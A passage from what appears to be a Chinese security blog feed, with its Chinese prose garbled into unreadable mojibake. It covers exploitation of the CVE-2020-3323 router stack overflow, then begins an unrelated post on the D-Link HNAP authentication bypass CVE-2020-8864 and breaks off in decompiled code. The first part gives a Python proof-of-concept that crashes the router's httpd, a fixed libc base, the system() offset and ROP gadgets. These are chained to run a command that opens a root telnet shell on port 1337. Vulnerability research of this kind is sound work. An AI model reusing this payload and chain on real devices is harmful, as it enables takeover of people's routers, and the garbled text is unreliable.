<p>ç¬¬ 30 è¡Œä»£ç ä» upnp_context ç»“æ„ä½“ä¸­è·å–äº†æŸä¸ªæ•°æ®ï¼Œé€šè¿‡å¯¹ä¸‹é¢æµç¨‹çš„åˆ†æå¯ä»¥ç¡®å®šè¿™é‡Œè·å–çš„æ˜¯ ST å­—æ®µï¼Œç¬¬ 78 è¡Œä»£ç å¼•ç”¨äº† strcpy å‡½æ•°å°†å†…å®¹ç›´æ¥æ‹·è´åˆ°æ ˆå˜é‡ä¸­ï¼Œå¦‚æœæ”»å‡»è€…ä¼ å…¥ä¸€ä¸ªè¶…é•¿çš„å­—ç¬¦ä¸²ï¼Œå°†å¯¼è‡´æ ˆæº¢å‡ºã€‚(æ”»å‡»åˆ†æè§ä¸‹æ–‡)</p>
<h2 id="æ¼æ´åˆ©ç”¨åˆ†æ"><a href="#æ¼æ´åˆ©ç”¨åˆ†æ" class="headerlink" title="æ¼æ´åˆ©ç”¨åˆ†æ"></a>æ¼æ´åˆ©ç”¨åˆ†æ</h2><p>åœ¨å…·ä½“åˆ†æä¹‹å‰ï¼Œå…ˆè®¾ç½®å¥½åˆ†æç¯å¢ƒï¼Œæ‹†å¼€è·¯ç”±å™¨ä¹‹ååœ¨å³ä¸Šè§’å¯ä»¥æ‰¾åˆ° UART ä¸²å£ï¼Œå¹¶ä¸”æ ‡è®°äº†æ¥å£åç§°ï¼Œåªéœ€è¦ç„Šæ¥å¥½æ’é’ˆå°±å¯ä»¥ä½¿ç”¨äº†ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2020-3323-1.jpg"
                     
                ></p>
<p>æ¥å…¥ FT232 ä¹‹ååœ¨ç”µè„‘æ‰“å¼€ä¸²å£è½¯ä»¶ï¼Œè®¾å¤‡å¯åŠ¨å®Œæ¯•æŒ‰å›è½¦æ‹¿åˆ° shell</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2020-3323-2.png"
                     
                ></p>
<p>å…ˆä¸Šä¼ ä¸€ä¸ª gdbserver æ–¹ä¾¿åç»­è°ƒè¯•ï¼Œè®¾å¤‡é»˜è®¤å¸¦äº† wget å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æœ¬æœºå¼€å¯ä¸€ä¸ª Server æ”¾å…¥ gdbserverï¼Œç„¶åç”¨ wget ä¸‹è½½åˆ°è·¯ç”±å™¨ã€‚</p>
<p>gdbserver ä¸‹è½½é“¾æ¥ï¼šé“¾æ¥ï¼š<a class="link"   href="https://pan.baidu.com/s/1e6-lxtzI0aXNe0aGfiWRCg" >https://pan.baidu.com/s/1e6-lxtzI0aXNe0aGfiWRCg<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>     æå–ç ï¼šyyln </p>
<p>wget å‘½ä»¤</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.1.101:8000/gdbserver.mipsle</span><br></pre></td></tr></table></figure></div>

<h3 id="CVE-2020-3323-1"><a href="#CVE-2020-3323-1" class="headerlink" title="CVE-2020-3323"></a>CVE-2020-3323</h3><p>ç»è¿‡ä¸Šé¢çš„ç¯å¢ƒé…ç½®ï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥å¯¹ httpd æœåŠ¡è¿›è¡Œè°ƒè¯•ï¼Œå…ˆåœ¨è·¯ç”±å™¨ä¸Šé¢æ‰¾åˆ° httpd è¿›ç¨‹ pid</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps | grep http</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œä¼šè¿”å›ä¸¤ä¸ªç»“æœ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ps | grep http</span><br><span class="line">  348 admin      6284 S   httpd </span><br><span class="line">  356 admin      6344 S   httpd -S </span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ httpd -S æ˜¯æˆ‘ä»¬çš„è°ƒè¯•ç›®æ ‡ã€‚å¯åŠ¨ gdbserver è¿›è¡Œé™„åŠ </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./gdbserver.mipsle 192.168.1.1:12345 --attach 356</span><br></pre></td></tr></table></figure></div>

<p>æˆåŠŸé™„åŠ ä¹‹ååœ¨æœ¬æœºå¯åŠ¨ gdb-multiarchï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set sysroot ./</span><br><span class="line">file ./usr/sbin/httpd</span><br><span class="line">target remote 192.168.1.1:12345</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2020-3323-3.png"
                     
                ></p>
<p>æˆåŠŸå¯åŠ¨è°ƒè¯•ç¯å¢ƒï¼Œå¯ä»¥å…ˆç¼–å†™ä¸€ä¸ª POC è„šæœ¬ï¼Œæ–¹ä¾¿åç»­æ“ä½œï¼Œä¹‹å‰åˆ†æäº†æ¼æ´æˆå› ï¼Œå¯ç¼–å†™å‡ºä¸‹é¢çš„ POC è„šæœ¬</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-ip&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;target ip&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.ip:</span><br><span class="line">    payload = <span class="string">&quot;status_guestnet.asp&quot;</span> +<span class="string">&quot;a&quot;</span> * <span class="number">0x100</span></span><br><span class="line">    burp0_url = <span class="string">&quot;https://&quot;</span> + args.ip + <span class="string">&quot;:443/guest_logout.cgi&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, </span><br><span class="line">                     <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;cmac&quot;</span>: <span class="string">&quot;00:01:02:03:04:05&quot;</span>, </span><br><span class="line">                  <span class="string">&quot;cip&quot;</span>: <span class="string">&quot;192.168.1.1&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;submit_button&quot;</span>: payload&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Exploit Success!&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>ä½¿ç”¨æ–¹æ³•ï¼špython poc.py -ip 192.168.1.1</p>
<p>å‘é€ payload ä¹‹å gdb ä¸­çœ‹åˆ°å´©æºƒç»“æœ</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2020-3323-4.png"
                     
                ></p>
<p>æˆåŠŸæ§åˆ¶ PCï¼Œæ¥ä¸‹æ¥å°±å°è¯•åˆ©ç”¨æ¼æ´ã€‚</p>
<p>å…³äº MIPS æ¶æ„çš„æ¼æ´åˆ©ç”¨æ–‡ç« ç½‘ç»œä¸Šæœ‰å¾ˆå¤šï¼Œè¿™é‡Œå°±ä¸è¯¦ç»†ä»‹ç»äº†ï¼Œç”±äºæ•´ä¸ªç³»ç»Ÿæ²¡æœ‰å¼€å¯ aslrï¼Œlibc åœ°å€å›ºå®šï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯æ„é€  ROP ç›´æ¥æ‰§è¡Œ system å‡½æ•°ï¼Œå‚æ•°ä¸­æ’å…¥å¼€å¯ telnetd çš„å‘½ä»¤ã€‚</p>
<p>é¦–å…ˆç”¨ vmmap å‘½ä»¤è·å–è®¾å¤‡çš„ libc åœ°å€ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">  0x400000   0x491000 r-xp    91000 0      /usr/sbin/httpd</span><br><span class="line">  0x4d0000   0x4d8000 rw-p     8000 90000  /usr/sbin/httpd</span><br><span class="line">  0x4d8000   0x50e000 rwxp    36000 4d8000 [heap]</span><br><span class="line">0x2aaa8000 0x2aaad000 r-xp     5000 0      /lib/ld-uClibc.so.0</span><br><span class="line">0x2aaad000 0x2aaae000 rw-p     1000 2aaad000 </span><br><span class="line">0x2aaae000 0x2aabe000 r--p    10000 0      /dev/nvram</span><br><span class="line">0x2aaec000 0x2aaed000 r--p     1000 4000   /lib/ld-uClibc.so.0</span><br><span class="line">0x2aaed000 0x2aaee000 rw-p     1000 5000   /lib/ld-uClibc.so.0</span><br><span class="line">0x2aaee000 0x2aaf2000 r-xp     4000 0      /usr/lib/libnvram.so</span><br><span class="line">0x2aaf2000 0x2ab32000 ---p    40000 2aaf2000 </span><br><span class="line">0x2ab32000 0x2ab33000 rw-p     1000 4000   /usr/lib/libnvram.so</span><br><span class="line">0x2ab33000 0x2ab75000 r-xp    42000 0      /usr/lib/libshared.so</span><br><span class="line">0x2ab75000 0x2abb5000 ---p    40000 2ab75000 </span><br><span class="line">0x2abb5000 0x2abb9000 rw-p     4000 42000  /usr/lib/libshared.so</span><br><span class="line">0x2abb9000 0x2abbd000 rw-p     4000 2abb9000 </span><br><span class="line">0x2abbd000 0x2abcc000 r-xp     f000 0      /usr/lib/libcbt.so</span><br><span class="line">0x2abcc000 0x2ac0b000 ---p    3f000 2abcc000 </span><br><span class="line">0x2ac0b000 0x2ac0c000 rw-p     1000 e000   /usr/lib/libcbt.so</span><br><span class="line">0x2ac0c000 0x2ac0e000 r-xp     2000 0      /lib/libdl.so.0</span><br><span class="line">0x2ac0e000 0x2ac4d000 ---p    3f000 2ac0e000 </span><br><span class="line">0x2ac4d000 0x2ac4e000 r--p     1000 1000   /lib/libdl.so.0</span><br><span class="line">0x2ac4e000 0x2ac4f000 rw-p     1000 2000   /lib/libdl.so.0</span><br><span class="line">0x2ac4f000 0x2ae3c000 r-xp   1ed000 0      /usr/lib/libcrypto.so</span><br><span class="line">0x2ae3c000 0x2ae7c000 ---p    40000 2ae3c000 </span><br><span class="line">0x2ae7c000 0x2ae94000 rw-p    18000 1ed000 /usr/lib/libcrypto.so</span><br><span class="line">0x2ae94000 0x2ae98000 rw-p     4000 2ae94000 </span><br><span class="line">0x2ae98000 0x2af02000 r-xp    6a000 0      /usr/lib/libssl.so</span><br><span class="line">0x2af02000 0x2af42000 ---p    40000 2af02000 </span><br><span class="line">0x2af42000 0x2af48000 rw-p     6000 6a000  /usr/lib/libssl.so</span><br><span class="line">0x2af48000 0x2af58000 r-xp    10000 0      /lib/libgcc_s.so.1</span><br><span class="line">0x2af58000 0x2af97000 ---p    3f000 2af58000 </span><br><span class="line">0x2af97000 0x2af98000 rw-p     1000 f000   /lib/libgcc_s.so.1</span><br><span class="line">0x2af98000 0x2afef000 r-xp    57000 0      /lib/libc.so.0</span><br><span class="line">0x2afef000 0x2b02f000 ---p    40000 2afef000 </span><br><span class="line">0x2b02f000 0x2b030000 r--p     1000 57000  /lib/libc.so.0</span><br><span class="line">0x2b030000 0x2b031000 rw-p     1000 58000  /lib/libc.so.0</span><br><span class="line">0x2b031000 0x2b036000 rw-p     5000 2b031000 </span><br><span class="line">0x7f94b000 0x7f960000 rwxp    15000 7f94b000 [stack]</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ° libc åŠ è½½åˆ° 0x2af98000 è¿™ä¸ªåœ°å€ï¼Œå¹¶ä¸”æ¯æ¬¡é‡å¯éƒ½ä¸ä¼šæ”¹å˜ã€‚</p>
<p>ROP æ€è·¯æ˜¯è°ƒç”¨ system(â€œutelnetd -d -l &#x2F;bin&#x2F;sh -p 1337 &amp;â€)ï¼Œæœ‰äº† libc åœ°å€æ¥ä¸‹æ¥éœ€è¦å¯»æ‰¾ system å‡½æ•°çš„åœ°å€ï¼Œç›®æ ‡ libc æ–‡ä»¶ä½äº &#x2F;lib&#x2F;libc.so.0ï¼Œå°†å®ƒåŠ è½½åˆ° IDA å¯ä»¥æ‰¾åˆ° system å‡½æ•°çš„åç§»é‡ä¸º 0x0004C7E0ã€‚</p>
<p>æ‰¾åˆ° system å‡½æ•°åœ°å€ï¼Œè¿˜éœ€è¦è§£å†³å‚æ•°çš„é—®é¢˜ï¼ŒMIPS ä¸­å‡½æ•°çš„å‰å‡ ä¸ªå‚æ•°ç”± a0ã€a1 ç­‰å¯„å­˜å™¨è¿›è¡Œä¼ é€’ï¼Œè€Œç”±äºå¯æ§çš„å†…å­˜åªåœ¨æ ˆä¸Šï¼Œæ‰€ä»¥è‚¯å®šè¦æƒ³åŠæ³•æŠŠæ ˆåœ°å€åŠ è½½åˆ°è¿™äº›å¯„å­˜å™¨ä¸­ã€‚</p>
<p>ç”±äº MIPS æ¶æ„çš„ç‰¹æ€§ï¼Œç¡®å®å­˜åœ¨è¿™ç±»æŒ‡ä»¤å¯ä»¥ç”¨äº ROPï¼Œåœ¨ mips rop finder ä¸­ä½¿ç”¨ mipsrop.stackfinder() å°±å¯ä»¥æ‰¾åˆ°ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Python&gt;mipsrop.stackfinder()</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x0000BA84  |  addiu $a1,$sp,0x168+var_B0                          |  jalr  $s0                             |</span><br><span class="line">|  0x00011918  |  addiu $a2,$sp,0x88+var_60                           |  jalr  $s1                             |</span><br><span class="line">|  0x000250A8  |  addiu $s0,$sp,0x2A0+var_278                         |  jalr  $fp                             |</span><br><span class="line">|  0x000257A0  |  addiu $a0,$sp,0x58+var_40                           |  jalr  $s0                             |</span><br><span class="line">|  0x00025CAC  |  addiu $a0,$sp,0x60+var_48                           |  jalr  $s3                             |</span><br><span class="line">|  0x0002747C  |  addiu $a0,$sp,0x60+var_48                           |  jalr  $s3                             |</span><br><span class="line">|  0x0002CC00  |  addiu $a0,$sp,0x48+var_20                           |  jalr  $s0                             |</span><br><span class="line">|  0x0002CC08  |  addiu $a0,$sp,0x48+var_20                           |  jalr  $s1                             |</span><br><span class="line">|  0x00035DF4  |  addiu $a1,$sp,0x40+var_28                           |  jalr  $s1                             |</span><br><span class="line">|  0x0003D050  |  addiu $a0,$sp,0x38+var_20                           |  jalr  $a0                             |</span><br><span class="line">|  0x000427A8  |  addiu $s0,$sp,0xE0+var_C0                           |  jalr  $s6                             |</span><br><span class="line">|  0x00042E04  |  addiu $v1,$sp,0x118+var_F8                          |  jalr  $s1                             |</span><br><span class="line">|  0x0000D45C  |  addiu $a0,$sp,0xA0+var_88                           |  jr    0xA0+var_4($sp)                 |</span><br><span class="line">|  0x0000ED70  |  addiu $a1,$sp,0x28+var_10                           |  jr    0x28+var_8($sp)                 |</span><br><span class="line">|  0x0001D5FC  |  addiu $a3,$sp,0x30+var_10                           |  jr    0x30+var_8($sp)                 |</span><br><span class="line">|  0x00020100  |  addiu $a0,$sp,0x30+var_18                           |  jr    0x30+var_8($sp)                 |</span><br><span class="line">|  0x0002C060  |  addiu $a0,$sp,0x80+var_68                           |  jr    0x80+var_4($sp)                 |</span><br><span class="line">|  0x0002F800  |  addiu $a1,$sp,0x58+var_40                           |  jr    0x58+var_8($sp)                 |</span><br><span class="line">|  0x00030434  |  addiu $a0,$sp,0x48+var_30                           |  jr    0x48+var_8($sp)                 |</span><br><span class="line">|  0x00039948  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x000399A0  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x000399F8  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x00039A50  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x00039A90  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x00039AFC  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x00039B5C  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_8($sp)                 |</span><br><span class="line">|  0x0003A844  |  addiu $a0,$sp,0x50+var_38                           |  jr    0x50+var_4($sp)                 |</span><br><span class="line">|  0x0003D05C  |  addiu $a0,$sp,0x38+var_20                           |  jr    0x38+var_8($sp)                 |</span><br><span class="line">|  0x0004BAA8  |  addiu $a1,$sp,0x3048+var_1030                       |  jr    0x3048+var_4($sp)               |</span><br><span class="line">|  0x0004D314  |  addiu $a2,$sp,0x28+var_10                           |  jr    0x28+var_8($sp)                 |</span><br><span class="line">|  0x0004D484  |  addiu $a2,$sp,0x28+var_10                           |  jr    0x28+var_8($sp)                 |</span><br><span class="line">|  0x0004D8E4  |  addiu $a2,$sp,0x28+var_10                           |  jr    0x28+var_8($sp)                 |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 32 matching gadgets</span><br></pre></td></tr></table></figure></div>

<p>å…·ä½“åº”è¯¥ç”¨å“ªæ¡å°±è¦é€šè¿‡è°ƒè¯•æ¥ç¡®å®šäº†ï¼Œæˆ‘ä»¬å¸Œæœ›æ‰§è¡Œ system å‡½æ•°ï¼Œæ‰€ä»¥è¦å°†æ ˆåœ°å€åŠ è½½åˆ° a0 å¯„å­˜å™¨ä¸­ï¼Œé€šè¿‡è°ƒè¯•å‘ç° 0x000257A0 è¿™æ¡æŒ‡ä»¤æ¯”è¾ƒåˆé€‚ã€‚å¦å¤–è¿˜éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œè¿™ç±» gadget çš„è½¬ç§»æ¡ä»¶å¹¶ä¸æ˜¯åƒ x86 ä¸€æ ·é€šè¿‡æ ˆä¸­çš„è¿”å›åœ°å€è¿”å›ï¼Œè€Œæ˜¯ jr &lt;æŸä¸ªå†…å­˜åœ°å€ or å¯„å­˜å™¨&gt;ï¼Œæˆ‘ä»¬é€‰æ‹©çš„è¿™æ¡ gadget è½¬ç§»æ¡ä»¶æ˜¯ jr $s0ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œéœ€è¦æå‰æ§åˆ¶ s0 å¯„å­˜å™¨ä¸ºä¸‹ä¸€ä¸ª gadget çš„åœ°å€ï¼Œæ‰èƒ½ä¿è¯ ROP é“¾é¡ºåˆ©æ‰§è¡Œã€‚</p>
<p>ä¸€èˆ¬æƒ…å†µä¸‹ MIPS å‡½æ•°è¿”å›çš„æ—¶å€™éƒ½ä¼šæŠŠæ ˆä¸­çš„éƒ¨åˆ†æ•°æ®è½¬ç§»åˆ° s0 ~ s8 å¯„å­˜å™¨ä¸­ï¼Œæ‰€ä»¥åªè¦æå‰åœ¨æ ˆä¸­å¸ƒç½®å¥½ s0 å¯¹åº”çš„åœ°å€å³å¯ã€‚</p>
<p>åˆ°è¿™é‡Œå¿…è¦çš„åœ°å€éƒ½æ‰¾åˆ°äº†ï¼Œpayload çš„æ„æˆåº”è¯¥æ˜¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">padding + next_gadget_address + padding2 + gadget_address + padding3 + command</span><br></pre></td></tr></table></figure></div>

<p>gadget_address å æ®è¿”å›åœ°å€çš„ä½ç½®ï¼Œç¨‹åºè·‘åˆ°è¿™é‡Œå…ˆè¿è¡Œç¬¬ä¸€æ®µ gadgetï¼Œå°†æ ˆåœ°å€åŠ è½½åˆ° a0ï¼Œè¿™ä¸ªåœ°å€å°±æŒ‡å‘ commandï¼Œç„¶å jr $s0ï¼Œè¿”å›åˆ° next_gadget_addressï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œ system å‡½æ•°ï¼Œä»è€Œå®ç° system(command)ã€‚</p>
<p><a href="https://asciinema.org/a/EViNYMB5pl6esKop0lktUIZ22"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://asciinema.org/a/EViNYMB5pl6esKop0lktUIZ22.svg"
                      alt="asciicast"
                ></a></p>
<h3 id="CVE-2021-34730-1"><a href="#CVE-2021-34730-1" class="headerlink" title="CVE-2021-34730"></a>CVE-2021-34730</h3><p>upnp è¿™ä¸ªä¹Ÿæ˜¯æ ˆæº¢å‡ºæ¼æ´ï¼Œåˆ©ç”¨æ€è·¯å’Œä¸Šä¸€ä¸ªéå¸¸ç±»ä¼¼ï¼Œæ‰§è¡Œ system(command) å³å¯ï¼Œä¸è¿‡ upnp æœåŠ¡å¼€æ”¾åœ¨ udp ç«¯å£ï¼Œåœ¨ç¼–å†™è„šæœ¬çš„æ—¶å€™å¯èƒ½éœ€è¦æ³¨æ„ä¸€ä¸‹ã€‚</p>
<p><a href="https://asciinema.org/a/Orv3mcq3JBkhVUcTh6ttyXEHv"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://asciinema.org/a/Orv3mcq3JBkhVUcTh6ttyXEHv.svg"
                      alt="asciicast"
                ></a></p>
<h3 id="åå°æ ˆæº¢å‡º"><a href="#åå°æ ˆæº¢å‡º" class="headerlink" title="åå°æ ˆæº¢å‡º"></a>åå°æ ˆæº¢å‡º</h3><p>æ¼æ´åˆ©ç”¨æ€è·¯å’Œå‰é¢çš„ç›¸åŒï¼Œä½†æ˜¯åå°ä»·å€¼ä¸é«˜ï¼Œå°±ä¸æ¼”ç¤ºäº†ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>IoT è®¾å¤‡ä¸­èº«ä»½éªŒè¯ç»•è¿‡çš„ä¸€äº›æ¼æ´(1)</title>
    <url>/2020/08/28/bypass_auth/</url>
    <content><![CDATA[<p><strong>Update: 2021-01-18ï¼š  ä¿®æ­£ CVE-2020-8861 åˆ†æè¿‡ç¨‹</strong></p>
<p>åœ¨ IoT æ¼æ´ä¸­ï¼Œèº«ä»½éªŒè¯æ¼æ´å‡ºç°é¢‘ç‡è¾ƒé«˜ï¼Œå¹¶ä¸”èƒ½å¤Ÿé€ æˆçš„å±å®³å¾ˆå¤§ï¼Œé€šè¿‡èº«ä»½éªŒè¯çš„ç»•è¿‡ï¼Œæ”»å‡»è€…å¯ä»¥è®¿é—®åˆ°å¾ˆå¤šæ•æ„Ÿ APIï¼Œç”šè‡³å¯ä»¥ç»“åˆå…¶ä»–æ¼æ´ç›´æ¥è·å–è®¾å¤‡ shellï¼Œç»™ç”¨æˆ·å¸¦æ¥é‡å¤§æŸå¤±ã€‚</p>
<span id="more"></span>

<h1 id="CVE-2020-8864"><a href="#CVE-2020-8864" class="headerlink" title="CVE-2020-8864"></a>CVE-2020-8864</h1><p>2020 å¹´ 2 æœˆ 24 æ—¥ï¼ŒZDI å›¢é˜ŸæŠ«éœ²äº†å­˜åœ¨äº D-Link å¤šä¸ªå‹å·è·¯ç”±å™¨ä¸­çš„èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ï¼Œé€šè¿‡åˆ©ç”¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä» LAN ä¾§è½»æ˜“çš„æ§åˆ¶è·¯ç”±å™¨ï¼Œå®ç°ä¿®æ”¹ admin ç”¨æˆ·å¯†ç ã€ç¯¡æ”¹è·¯ç”±å™¨é»˜è®¤é…ç½®ã€ç”šè‡³ç»“åˆå…¶ä»–æ¼æ´å®ç°è •è™«æ¤å…¥ç­‰æ“ä½œã€‚</p>
<h2 id="æ¼æ´åŸºæœ¬ä¿¡æ¯"><a href="#æ¼æ´åŸºæœ¬ä¿¡æ¯" class="headerlink" title="æ¼æ´åŸºæœ¬ä¿¡æ¯"></a>æ¼æ´åŸºæœ¬ä¿¡æ¯</h2><p>ä»¥ä¸‹æ˜¯ä»æŠ«éœ²é¡µé¢æ‘˜æŠ„çš„æ¼æ´ä¿¡æ¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of D-Link DIR-867, DIR-878, and DIR-882 routers. Authentication is not required to exploit this vulnerability.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the handling of HNAP login requests. The issue results from the lack of proper handling of empty passwords. An attacker can leverage this vulnerability to execute arbitrary code on the router.</span><br></pre></td></tr></table></figure></div>

<p>æ­¤æ¼æ´å½±å“ DIR-867, DIR-878, DIR-882 è·¯ç”±å™¨ï¼Œæ¼æ´äº§ç”ŸåŸå› å¤§æ¦‚æ˜¯åœ¨å¤„ç† HNAP è¯·æ±‚è¿‡ç¨‹ä¸­ï¼Œç”±äºç¼ºå°‘äº†å¯¹ç©ºå¯†ç çš„éªŒè¯æµç¨‹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ç©ºå¯†ç ç»•è¿‡èº«ä»½éªŒè¯ï¼Œä»è€Œè®¿é—®æ•æ„Ÿ API æ¥å£ã€‚</p>
<p>æ¼æ´ç±»å‹ï¼šèº«ä»½éªŒè¯ç»•è¿‡</p>
<p>æ¼æ´å¨èƒï¼šè¾ƒé«˜ (8.8)</p>
<p>æ¼æ´å½±å“ï¼šæ”»å‡»è€…ç»•è¿‡èº«ä»½éªŒè¯ï¼Œä»è€Œè®¿é—®æ•æ„Ÿ APIï¼Œæ‰§è¡Œæ•æ„Ÿæ“ä½œã€‚</p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å¯ä»¥å» <a class="link"   href="ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/" >ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ä¸‹è½½å›ºä»¶ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯ 1.10B02 25MB ç‰ˆæœ¬ï¼Œå…¶ä¸­åŒ…å«äº†æœªåŠ å¯†çš„å›ºä»¶ï¼Œå¯ä»¥ç›´æ¥æ‹¿è¿‡æ¥è¿›è¡Œè§£åŒ…ã€‚</p>
<p>è§£åŒ…ä¹‹åç®€å•çœ‹ä¸€ä¸‹æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œweb æœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯ lighttpdï¼Œé€šè¿‡æŸ¥çœ‹å…¶é…ç½®æ–‡ä»¶ï¼Œå‘ç°å¤§éƒ¨åˆ†è¯·æ±‚éƒ½ä¼šè¢«è½¬å‘åˆ° prog.cgi è¿›è¡Œå¤„ç†ã€‚</p>
<p>æ‹¿åˆ° prog.cgi æ”¾è¿› Ghidra è¿›è¡Œåˆ†æï¼Œæ ¹æ®æ¼æ´ä¿¡æ¯ï¼Œæˆ‘ä»¬éœ€è¦å¯»æ‰¾å¤„ç† HNAP ç™»å½•è¯·æ±‚çš„ä»£ç ï¼Œå…ˆæœç´¢å­—ç¬¦ä¸² Login çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰ä»€ä¹ˆçº¿ç´¢ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/aubypass-1.png"
                     
                ></p>
<p>æ‰¾åˆ°äº†å‡ ä¸ªåŒ…å« login çš„å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ç¬¬ä¸€é¡¹ &#x2F;HNAP1&#x2F;login æ„Ÿè§‰å’Œè¯·æ±‚æœ‰å…³ï¼Œé€šè¿‡æŸ¥æ‰¾äº¤å‰å¼•ç”¨ï¼Œæ‰¾åˆ°äº†å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">undefined4 <span class="title function_">FUN_0041ed9c</span><span class="params">(<span class="type">int</span> param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  </span><br><span class="line">  iVar1 = <span class="built_in">strncmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0xc4</span>),<span class="string">&quot;/HNAP1/Login&quot;</span>,<span class="number">0xc</span>);</span><br><span class="line">  <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) || (iVar1 = <span class="built_in">strncmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0xc4</span>),<span class="string">&quot;/HNAP1/Logout&quot;</span>,<span class="number">0xd</span>), iVar1 ==<span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    uVar2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> 